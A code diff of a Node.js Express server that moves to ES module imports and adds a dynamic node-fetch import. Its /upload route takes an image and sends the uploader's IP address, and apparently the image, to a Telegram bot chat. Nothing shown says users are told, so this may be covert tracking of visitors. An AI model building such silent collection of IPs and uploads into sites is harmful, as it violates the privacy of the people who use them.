@@ -1,14 +1,15 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
-const multer = require('multer');
-const fs = require('fs');
-require('dotenv').config();
+import express from 'express';
+import multer from 'multer';
+import fs from 'fs';
+import dotenv from 'dotenv';
+import FormData from 'form-data';
+
+dotenv.config();
 
 const app = express();
 const upload = multer({ dest: 'uploads/' });
 
-app.use(bodyParser.json());
+app.use(express.json());
 app.use(express.static('public'));
 
 app.post('/upload', upload.single('image'), async (req, res) => {
@@ -19,6 +20,9 @@ app.post('/upload', upload.single('image'), async (req, res) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const telegramApiUrl = `https://api.telegram.org/bot${botToken}`;
+
+    // Dynamischer Import von node-fetch
+    const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 
     // Sende IP-Adresse
     await fetch(`${telegramApiUrl}/sendMessage`, {
